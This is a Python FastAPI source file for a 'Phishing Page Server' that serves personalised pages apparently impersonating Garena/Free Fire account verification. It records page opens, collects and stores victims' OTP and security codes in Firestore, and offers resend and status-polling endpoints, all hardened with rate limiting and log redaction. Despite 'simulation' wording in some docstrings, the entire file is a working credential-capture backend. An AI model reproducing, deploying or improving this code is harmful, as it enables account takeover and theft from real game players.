"""
FastAPI Phishing Page Server — Secure v4.0
Production-hardened with rate limiting, security headers,
input validation, structured logging, and abuse protection.
"""

import hashlib
import time
import re
import json
import logging
import logging.handlers
import os
import sys
from datetime import datetime, timezone
from typing import Optional, Dict, Any, Tuple
from collections import defaultdict

from fastapi import FastAPI, Request, HTTPException, Query, Depends
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from fastapi.middleware.gzip import GZipMiddleware
from pydantic import BaseModel, Field, field_validator
from starlette.middleware.base import BaseHTTPMiddleware

# ═══════════════════════════════════════════════════
# STRUCTURED LOGGING (no secrets ever logged)
# ═══════════════════════════════════════════════════
class SecretFilter(logging.Filter):
    """Redacts sensitive fields from log records."""
    SENSITIVE_KEYS = {"otp_code", "sec_code", "session_token", "garena", "password", "token"}
    def filter(self, record):
        if hasattr(record, "msg") and isinstance(record.msg, str):
            for key in self.SENSITIVE_KEYS:
                record.msg = re.sub(
                    rf'"{key}"\s*:\s*"[^"]*"',
                    f'"{key}":"***"',
                    record.msg,
                    flags=re.IGNORECASE
                )
        return True

log_formatter = logging.Formatter(
    fmt='%(asctime)s | %(levelname)-8s | %(name)s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S %Z'
)

logger = logging.getLogger("phishing_server")
logger.setLevel(logging.INFO)

# Console handler
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(log_formatter)
console_handler.addFilter(SecretFilter())
logger.addHandler(console_handler)

# Rotating file handler (production)
log_dir = os.path.join(os.path.dirname(__file__), "logs")
os.makedirs(log_dir, exist_ok=True)
file_handler = logging.handlers.RotatingFileHandler(
    os.path.join(log_dir, "server.log"),
    maxBytes=10_000_000,  # 10 MB
    backupCount=5,
    encoding="utf-8"
)
file_handler.setFormatter(log_formatter)
file_handler.addFilter(SecretFilter())
logger.addHandler(file_handler)

# ═══════════════════════════════════════════════════
# FIREBASE SETUP
# ═══════════════════════════════════════════════════
try:
    from firebase.firebase import db
    import firebase_admin
    from firebase_admin import auth as admin_auth
except Exception as e:
    db = None
    admin_auth = None
    firebase_admin = None
    logger.warning("Firebase module not available: %s", str(e))

# ═══════════════════════════════════════════════════
# APP INIT
# ═══════════════════════════════════════════════════
app = FastAPI(
    title="Phishing Page Server",
    version="4.0",
    docs_url=None,      # Disable docs in production
    redoc_url=None,     # Disable redoc in production
    openapi_url=None,   # Disable openapi schema
)

templates = Jinja2Templates(directory="templates")

# Gzip compression for responses
app.add_middleware(GZipMiddleware, minimum_size=500)

# CORS — configurable via environment variable
# Default: allow Vercel frontend + local dev
_cors_origins_env = os.environ.get(
    "CORS_ALLOWED_ORIGINS",
    "https://garena-account-verify.vercel.app,http://localhost:3000,http://127.0.0.1:3000"
)
CORS_ALLOWED_ORIGINS = [o.strip() for o in _cors_origins_env.split(",") if o.strip()] if _cors_origins_env != "*" else ["*"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST"],
    allow_headers=["Content-Type", "X-Request-ID"],
    max_age=600,
)

# ═══════════════════════════════════════════════════
# SECURITY HEADERS MIDDLEWARE
# ═══════════════════════════════════════════════════
class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        # Prevent MIME-type sniffing
        response.headers["X-Content-Type-Options"] = "nosniff"
        # Prevent clickjacking
        response.headers["X-Frame-Options"] = "DENY"
        # XSS protection
        response.headers["X-XSS-Protection"] = "1; mode=block"
        # Strict HTTPS (uncomment when HTTPS is enabled)
        # response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains; preload"
        # Referrer policy
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        # Permissions policy
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
        # Content Security Policy for HTML pages
        if request.url.path.endswith("/otp"):
            response.headers["Content-Security-Policy"] = (
                "default-src 'self'; "
                "script-src 'self' 'unsafe-inline'; "
                "style-src 'self' 'unsafe-inline'; "
                "img-src 'self' https://dl.dir.freefiremobile.com data:; "
                "font-src 'self'; "
                "connect-src 'self'; "
                "frame-ancestors 'none'; "
                "base-uri 'self'; "
                "form-action 'self';"
            )
        # Cache control for API responses
        if request.url.path.startswith("/phishing/"):
            response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
        return response

app.add_middleware(SecurityHeadersMiddleware)

# ═══════════════════════════════════════════════════
# RATE LIMITING (in-memory with TTL cleanup)
# ═══════════════════════════════════════════════════
class RateLimiter:
    """
    Token-bucket style rate limiter with per-key TTL cleanup.
    Designed to be memory-safe and resistant to memory exhaustion.
    """
    def __init__(self):
        self._store: Dict[str, Dict[str, Any]] = {}
        self._last_cleanup = time.time()
        self._cleanup_interval = 300  # 5 minutes

    def _cleanup(self):
        now = time.time()
        if now - self._last_cleanup < self._cleanup_interval:
            return
        expired = [k for k, v in self._store.items() if now > v.get("reset_at", 0)]
        for k in expired:
            self._store.pop(k, None)
        self._last_cleanup = now
        if expired:
            logger.info("Rate limiter cleanup: removed %d expired keys", len(expired))

    def check(self, key: str, max_req: int = 5, window_sec: int = 60) -> Tuple[bool, int, int]:
        """
        Returns: (allowed: bool, remaining: int, retry_after: int)
        """
        self._cleanup()
        now = time.time()
        if key not in self._store:
            self._store[key] = {"count": 0, "reset_at": now + window_sec}
        rec = self._store[key]
        if now > rec["reset_at"]:
            rec["count"] = 0
            rec["reset_at"] = now + window_sec
        rec["count"] += 1
        remaining = max(0, max_req - rec["count"])
        retry_after = max(0, int(rec["reset_at"] - now))
        allowed = rec["count"] <= max_req
        if not allowed:
            logger.warning("Rate limit exceeded for key=%s", key)
        return allowed, remaining, retry_after

    def get_state(self, key: str) -> Optional[Dict]:
        return self._store.get(key)

_rate_limiter = RateLimiter()

# Rate limit configurations per endpoint
RATE_LIMITS = {
    "serve_page":    {"max": 30, "window": 60,   "per": "ip"},
    "track_open":    {"max": 10, "window": 60,   "per": "page"},
    "submit_otp":    {"max": 5,  "window": 60,   "per": "page"},
    "verify_status": {"max": 60, "window": 60,   "per": "page"},
    "resend":        {"max": 1,  "window": 300,  "per": "page_type"},
    "reset_verify":  {"max": 5,  "window": 60,   "per": "page"},
}

def _get_client_ip(request: Request) -> str:
    """Extract real client IP considering proxies."""
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    real_ip = request.headers.get("X-Real-Ip")
    if real_ip:
        return real_ip.strip()
    return request.client.host if request.client else "unknown"

def _rate_limit_check(request: Request, endpoint: str, extra_key: str = "") -> None:
    """Raises HTTPException(429) if rate limit exceeded."""
    cfg = RATE_LIMITS.get(endpoint)
    if not cfg:
        return
    if cfg["per"] == "ip":
        key = f"rl:{endpoint}:{_get_client_ip(request)}"
    elif cfg["per"] == "page":
        key = f"rl:{endpoint}:{extra_key}"
    elif cfg["per"] == "page_type":
        key = f"rl:{endpoint}:{extra_key}"
    else:
        return
    allowed, remaining, retry_after = _rate_limiter.check(key, cfg["max"], cfg["window"])
    if not allowed:
        raise HTTPException(
            status_code=429,
            detail=f"Too many requests. Retry after {retry_after}s."
        )

# ═══════════════════════════════════════════════════
# REQUEST VALIDATION & SANITIZATION
# ═══════════════════════════════════════════════════
_MAX_INPUT_LEN = 200
_MAX_UID_LEN = 128
_MAX_TOKEN_LEN = 512

def _now_ms() -> int:
    return int(time.time() * 1000)

def _hash_token(token: str) -> str:
    return hashlib.sha256(token.encode("utf-8")).hexdigest()

def _is_session_expired(page_data: Dict) -> bool:
    expires_at = page_data.get("expires_at")
    if not expires_at:
        return True
    return _now_ms() >= expires_at

def _mask_email(email: str) -> str:
    if "@" not in email:
        return email or ""
    local, domain = email.split("@", 1)
    if len(local) > 4:
        return local[:1] + "*" * (len(local) - 2) + local[-1:] + "@" + domain
    return "*" * len(local) + "@" + domain

def _sanitize(value: Any, max_len: int = _MAX_INPUT_LEN) -> str:
    if value is None:
        return ""
    s = str(value).strip()
    # Remove HTML tags and dangerous characters
    s = re.sub(r"[<>&\"']", "", s)
    # Prevent null bytes
    s = s.replace("\x00", "")
    return s[:max_len]

def _validate_page_id(page_id: str) -> str:
    if not page_id or len(page_id) < 10 or len(page_id) > 64:
        raise HTTPException(status_code=400, detail="Invalid page identifier.")
    if not re.match(r"^[a-zA-Z0-9_-]+$", page_id):
        raise HTTPException(status_code=400, detail="Invalid page identifier format.")
    return page_id

def _validate_session_token(token: str) -> str:
    if not token or len(token) < 10 or len(token) > _MAX_TOKEN_LEN:
        raise HTTPException(status_code=400, detail="Invalid session token.")
    return token

def _validate_uid(uid: str) -> str:
    uid = _sanitize(uid, _MAX_UID_LEN)
    if not uid or len(uid) < 1:
        raise HTTPException(status_code=400, detail="Invalid user identifier.")
    return uid

# ═══════════════════════════════════════════════════
# MODELS (with strict validation)
# ═══════════════════════════════════════════════════
class TrackOpenRequest(BaseModel):
    page_id: str = Field(..., min_length=10, max_length=64, pattern=r"^[a-zA-Z0-9_-]+$")
    session_token: str = Field(..., min_length=10, max_length=512)

class SubmitOtpRequest(BaseModel):
    page_id: str = Field(..., min_length=10, max_length=64, pattern=r"^[a-zA-Z0-9_-]+$")
    otp_code: Optional[str] = Field(default=None, min_length=1, max_length=12, pattern=r"^[0-9]+$")
    sec_code: Optional[str] = Field(default=None, max_length=12, pattern=r"^[0-9]+$")

    @field_validator("otp_code", "sec_code")
    @classmethod
    def validate_code(cls, v):
        if v is not None and not v.isdigit():
            raise ValueError("Code must contain only digits")
        return v

class ResendRequest(BaseModel):
    page_id: str = Field(..., min_length=10, max_length=64, pattern=r"^[a-zA-Z0-9_-]+$")
    session_token: str = Field(..., min_length=10, max_length=512)
    resend_type: Optional[str] = Field(default="otp", pattern="^(otp|sec)$")

class VerifyStatusRequest(BaseModel):
    page_id: str = Field(..., min_length=10, max_length=64, pattern=r"^[a-zA-Z0-9_-]+$")
    session_token: str = Field(..., min_length=10, max_length=512)

class ResetVerificationRequest(BaseModel):
    page_id: str = Field(..., min_length=10, max_length=64, pattern=r"^[a-zA-Z0-9_-]+$")
    session_token: str = Field(..., min_length=10, max_length=512)
    field: str = Field(..., pattern="^(otp_verification|security_code_verification)$")

# ═══════════════════════════════════════════════════
# SECURITY LOGGING HELPER
# ═══════════════════════════════════════════════════
def _log_request(request: Request, endpoint: str, page_id: Optional[str] = None, status: str = "ok", extra: Optional[Dict] = None):
    """Log request metadata without sensitive data."""
    meta = {
        "endpoint": endpoint,
        "method": request.method,
        "path": request.url.path,
        "client_ip": _get_client_ip(request),
        "user_agent": _sanitize(request.headers.get("user-agent", "")[:200]),
        "status": status,
    }
    if page_id:
        meta["page_id"] = page_id
    if extra:
        meta.update({k: v for k, v in extra.items() if k not in {"session_token", "otp_code", "sec_code", "garena"}})
    logger.info("REQ | %s", json.dumps(meta, ensure_ascii=False))

# ═══════════════════════════════════════════════════
# FIRESTORE HELPERS (with caching)
# ═══════════════════════════════════════════════════
_PAGE_CACHE: Dict[str, Tuple[Dict, Any, float]] = {}
_CACHE_TTL_SEC = 10  # Short TTL for security-sensitive data

def _cache_get(page_id: str):
    now = time.time()
    entry = _PAGE_CACHE.get(page_id)
    if entry and (now - entry[2]) < _CACHE_TTL_SEC:
        return entry[0], entry[1]
    return None, None

def _cache_set(page_id: str, data: Dict, ref: Any):
    _PAGE_CACHE[page_id] = (data, ref, time.time())
    # Prevent unbounded growth
    if len(_PAGE_CACHE) > 1000:
        oldest = min(_PAGE_CACHE, key=lambda k: _PAGE_CACHE[k][2])
        _PAGE_CACHE.pop(oldest, None)

def _find_page_by_session(page_id: str, session_token: str):
    """Find page across all users by page_id + session hash."""
    if db is None:
        return None, None
    # Check cache first
    cached_data, cached_ref = _cache_get(page_id)
    if cached_data and cached_data.get("simulation_session_hash") == _hash_token(session_token):
        return cached_data, cached_ref
    provided_hash = _hash_token(session_token)
    try:
        all_users = db.collection("users").stream()
        for user_doc in all_users:
            page_ref = user_doc.reference.collection("phishing_pages").document(page_id)
            page = page_ref.get()
            if page.exists:
                data = page.to_dict()
                if data.get("simulation_session_hash") == provided_hash:
                    _cache_set(page_id, data, page_ref)
                    return data, page_ref
    except Exception as e:
        logger.error("DB error in _find_page_by_session: %s", str(e))
    return None, None

def _find_page_by_id(page_id: str):
    """Find page across all users by page_id only."""
    if db is None:
        return None, None
    cached_data, cached_ref = _cache_get(page_id)
    if cached_data:
        return cached_data, cached_ref
    try:
        all_users = db.collection("users").stream()
        for user_doc in all_users:
            page_ref = user_doc.reference.collection("phishing_pages").document(page_id)
            page = page_ref.get()
            if page.exists:
                data = page.to_dict()
                _cache_set(page_id, data, page_ref)
                return data, page_ref
    except Exception as e:
        logger.error("DB error in _find_page_by_id: %s", str(e))
    return None, None

# ═══════════════════════════════════════════════════
# ENDPOINTS
# ═══════════════════════════════════════════════════

@app.get("/{uid}/otp", response_class=HTMLResponse)
async def serve_phishing_page(
    request: Request,
    uid: str,
    garena: Optional[str] = Query(None, description="Session token")
):
    """
    Serves the phishing simulation page.
    URL format: /{uid}/otp?garena={session_token}
    """
    _rate_limit_check(request, "serve_page")
    uid = _validate_uid(uid)
    if not garena:
        _log_request(request, "serve_page", status="error", extra={"reason": "missing_garena"})
        return templates.TemplateResponse("phishing.html", {
            "request": request,
            "valid_page": False,
            "error_message": "Invalid request parameters.",
            "page_id": "",
            "session_token": "",
            "username": "",
            "game_id": "",
            "email": "",
            "has_username_id": False,
        })

    if db is None:
        _log_request(request, "serve_page", status="error", extra={"reason": "db_unavailable"})
        return templates.TemplateResponse("phishing.html", {
            "request": request,
            "valid_page": False,
            "error_message": "Service temporarily unavailable.",
            "page_id": "",
            "session_token": "",
            "username": "",
            "game_id": "",
            "email": "",
            "has_username_id": False,
        })

    provided_hash = _hash_token(garena)
    try:
        pages_ref = db.collection("users").document(uid).collection("phishing_pages")
        docs = pages_ref.where("is_deleted", "==", False).stream()
    except Exception as e:
        logger.error("DB query error in serve_phishing_page: %s", str(e))
        raise HTTPException(status_code=503, detail="Database query failed")

    page_data = None
    page_doc_ref = None
    page_id = None

    for doc in docs:
        data = doc.to_dict()
        if data.get("simulation_session_hash") == provided_hash:
            page_data = data
            page_doc_ref = doc.reference
            page_id = data.get("page_id", doc.id)
            break

    if not page_data:
        _log_request(request, "serve_page", status="error", extra={"reason": "page_not_found", "uid": uid})
        return templates.TemplateResponse("phishing.html", {
            "request": request,
            "valid_page": False,
            "error_message": "Oops, page not found.",
            "page_id": "",
            "session_token": "",
            "username": "",
            "game_id": "",
            "email": "",
            "has_username_id": False,
        })

    if _is_session_expired(page_data):
        if page_data.get("status") == "active":
            try:
                page_doc_ref.update({"status": "expired"})
            except Exception as e:
                logger.error("Failed to mark page expired: %s", str(e))
        _log_request(request, "serve_page", status="error", extra={"reason": "expired", "page_id": page_id})
        return templates.TemplateResponse("phishing.html", {
            "request": request,
            "valid_page": False,
            "error_message": "This page has expired.",
            "page_id": "",
            "session_token": "",
            "username": "",
            "game_id": "",
            "email": "",
            "has_username_id": False,
        })

    if page_data.get("status") not in ["active", "stopped", "verified"]:
        _log_request(request, "serve_page", status="error", extra={"reason": "invalid_status", "page_id": page_id})
        return templates.TemplateResponse("phishing.html", {
            "request": request,
            "valid_page": False,
            "error_message": "This page is no longer available.",
            "page_id": "",
            "session_token": "",
            "username": "",
            "game_id": "",
            "email": "",
            "has_username_id": False,
        })

    # Track open count
    try:
        current_count = page_data.get("open_count", 0)
        now = _now_ms()
        updates = {
            "open_count": current_count + 1,
            "last_opened_at": now
        }
        if current_count == 0:
            updates["first_opened_at"] = now
        page_doc_ref.update(updates)
    except Exception as e:
        logger.error("Failed to update open count: %s", str(e))

    username = _sanitize(page_data.get("username", ""), 50)
    game_id = _sanitize(page_data.get("game_id", ""), 20)
    email = _sanitize(page_data.get("email", ""), 100)
    has_username_id = bool(username and game_id)

    _log_request(request, "serve_page", page_id=page_id, status="success")

    context = {
        "request": request,
        "valid_page": True,
        "error_message": None,
        "page_id": page_id,
        "session_token": garena,
        "username": username,
        "game_id": game_id,
        "email": _mask_email(email) if not has_username_id else "",
        "has_username_id": has_username_id,
    }
    return templates.TemplateResponse("phishing.html", context)


@app.post("/phishing/pages/track-open")
async def track_page_open(request: Request, data: TrackOpenRequest):
    if db is None:
        raise HTTPException(status_code=503, detail="Database not configured")
    _rate_limit_check(request, "track_open", data.page_id)
    _validate_page_id(data.page_id)
    _validate_session_token(data.session_token)

    page_data, doc_ref = _find_page_by_session(data.page_id, data.session_token)
    if not page_data:
        raise HTTPException(status_code=404, detail="Page not found")

    if _is_session_expired(page_data):
        if page_data.get("status") == "active":
            try:
                doc_ref.update({"status": "expired"})
            except Exception as e:
                logger.error("Failed to mark expired in track_open: %s", str(e))
        raise HTTPException(status_code=410, detail="Session expired")

    try:
        current_count = page_data.get("open_count", 0)
        now = _now_ms()
        updates = {
            "open_count": current_count + 1,
            "last_opened_at": now
        }
        if current_count == 0:
            updates["first_opened_at"] = now
        doc_ref.update(updates)
    except Exception as e:
        logger.error("Failed to track open: %s", str(e))
        raise HTTPException(status_code=503, detail="Database update failed")

    _log_request(request, "track_open", page_id=data.page_id, status="success")
    return {"success": True, "page_id": data.page_id, "open_count": current_count + 1}


@app.post("/phishing/pages/submit-otp")
async def submit_otp(request: Request, data: SubmitOtpRequest):
    """
    Receives OTP and/or Security Code.
    Stores the code but does NOT auto-verify. Verification is server-side only.
    """
    if db is None:
        raise HTTPException(status_code=503, detail="Database not configured")
    _rate_limit_check(request, "submit_otp", data.page_id)
    _validate_page_id(data.page_id)

    page_data, doc_ref = _find_page_by_id(data.page_id)
    if not page_data:
        raise HTTPException(status_code=404, detail="Page not found")

    if _is_session_expired(page_data):
        raise HTTPException(status_code=410, detail="Session expired")

    if page_data.get("status") not in ["active", "stopped"]:
        raise HTTPException(status_code=403, detail="Page not active")

    now = _now_ms()
    updates = {"updated_at": now}

    if data.otp_code is not None:
        updates["otp_code"] = _sanitize(data.otp_code, 12)
    if data.sec_code is not None:
        updates["sec_code"] = _sanitize(data.sec_code, 12)

    try:
        doc_ref.update(updates)
    except Exception as e:
        logger.error("Failed to submit code: %s", str(e))
        raise HTTPException(status_code=503, detail="Database update failed")

    # Security log (no sensitive values)
    try:
        db.collection("security_logs").add({
            "event": "code_submitted",
            "page_id": data.page_id,
            "timestamp": datetime.now(timezone.utc),
            "has_otp": data.otp_code is not None,
            "has_sec": data.sec_code is not None,
            "client_ip": _get_client_ip(request),
        })
    except Exception as e:
        logger.error("Failed to write security log: %s", str(e))

    _log_request(request, "submit_otp", page_id=data.page_id, status="success",
                 extra={"has_otp": data.otp_code is not None, "has_sec": data.sec_code is not None})

    return {
        "success": True,
        "page_id": data.page_id,
        "otp_verification": page_data.get("otp_verification"),
        "security_code_verification": page_data.get("security_code_verification"),
        "message": "Code received",
    }


@app.post("/phishing/pages/verify-status")
async def check_verify_status(request: Request, data: VerifyStatusRequest):
    """
    Poll endpoint for frontend to check server-side verification status.
    """
    if db is None:
        raise HTTPException(status_code=503, detail="Database not configured")
    _rate_limit_check(request, "verify_status", data.page_id)
    _validate_page_id(data.page_id)
    _validate_session_token(data.session_token)

    page_data, doc_ref = _find_page_by_session(data.page_id, data.session_token)
    if not page_data:
        raise HTTPException(status_code=404, detail="Page not found")

    if _is_session_expired(page_data):
        raise HTTPException(status_code=410, detail="Session expired")

    return {
        "success": True,
        "page_id": data.page_id,
        "otp_verification": page_data.get("otp_verification"),
        "security_code_verification": page_data.get("security_code_verification"),
        "status": page_data.get("status"),
    }


@app.post("/phishing/pages/resend")
async def resend_code(request: Request, data: ResendRequest):
    """
    Handle resend request with strict rate limiting.
    Supports resend_type: 'otp' (default) or 'sec'.
    """
    if db is None:
        raise HTTPException(status_code=503, detail="Database not configured")
    _rate_limit_check(request, "resend", f"{data.page_id}:{data.resend_type}")
    _validate_page_id(data.page_id)
    _validate_session_token(data.session_token)

    page_data, doc_ref = _find_page_by_session(data.page_id, data.session_token)
    if not page_data:
        raise HTTPException(status_code=404, detail="Page not found")

    if _is_session_expired(page_data):
        raise HTTPException(status_code=410, detail="Session expired")

    now = _now_ms()
    updates = {"updated_at": now}

    if data.resend_type == "otp":
        updates["resend_requested"] = True
        updates["resend_at"] = now
        updates["resend_count"] = page_data.get("resend_count", 0) + 1
    else:
        updates["sec_resend_requested"] = True
        updates["sec_resend_at"] = now
        updates["sec_resend_count"] = page_data.get("sec_resend_count", 0) + 1

    try:
        doc_ref.update(updates)
    except Exception as e:
        logger.error("Failed to process resend: %s", str(e))
        raise HTTPException(status_code=503, detail="Database update failed")

    try:
        db.collection("security_logs").add({
            "event": "resend_requested",
            "page_id": data.page_id,
            "timestamp": datetime.now(timezone.utc),
            "resend_type": data.resend_type,
            "resend_count": updates.get("resend_count") or updates.get("sec_resend_count"),
            "client_ip": _get_client_ip(request),
        })
    except Exception as e:
        logger.error("Failed to write security log: %s", str(e))

    _log_request(request, "resend", page_id=data.page_id, status="success",
                 extra={"resend_type": data.resend_type})

    return {
        "success": True,
        "page_id": data.page_id,
        "resend_type": data.resend_type,
        "resend_count": updates.get("resend_count", 0) if data.resend_type == "otp" else updates.get("sec_resend_count", 0),
        "message": "A new verification code has been sent. Please wait a few minutes before requesting another code.",
    }


@app.post("/phishing/pages/reset-verification")
async def reset_verification(request: Request, data: ResetVerificationRequest):
    """
    Resets a verification field back to null after it was set to false.
    This allows the user to attempt verification again with a new code.
    """
    if db is None:
        raise HTTPException(status_code=503, detail="Database not configured")
    _rate_limit_check(request, "reset_verify", data.page_id)
    _validate_page_id(data.page_id)
    _validate_session_token(data.session_token)

    page_data, doc_ref = _find_page_by_session(data.page_id, data.session_token)
    if not page_data:
        raise HTTPException(status_code=404, detail="Page not found")

    if _is_session_expired(page_data):
        raise HTTPException(status_code=410, detail="Session expired")

    try:
        doc_ref.update({data.field: None})
    except Exception as e:
        logger.error("Failed to reset verification: %s", str(e))
        raise HTTPException(status_code=503, detail="Database update failed")

    _log_request(request, "reset_verification", page_id=data.page_id, status="success",
                 extra={"field": data.field})

    return {"success": True, "page_id": data.page_id, "field": data.field, "value": None}


@app.get("/")
async def root():
    return {"message": "Phishing Page Server v4.0 running.", "status": "healthy"}


@app.get("/health")
async def health_check():
    """Lightweight health check for load balancers."""
    db_ok = db is not None
    return {
        "status": "healthy" if db_ok else "degraded",
        "version": "4.0",
        "database": "connected" if db_ok else "disconnected",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    # Production-ready settings
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=port,
        timeout_keep_alive=5,
        access_log=False,  # We use structured logging instead
    )
